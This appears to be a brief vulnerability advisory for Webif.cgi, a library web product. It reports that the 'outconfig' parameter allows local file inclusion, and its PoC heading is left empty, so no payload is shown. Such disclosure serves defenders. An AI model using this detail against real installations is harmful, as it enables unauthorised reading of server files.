[#] SOFTWARE: Webif.cgi
http://www.ifnet.it/webif/

[#] DESCRIPTION:
Webif is the natural solution for librarianships who want visibility across 
the web or would like to manage Intranet networks, the whole at a reasonable price.

[#] BUG:
Input passed to the "outconfig" parameter in webif.cgi is not properly verified.
This can be exploited to include arbitrary files from local resources.

[#] PoC:
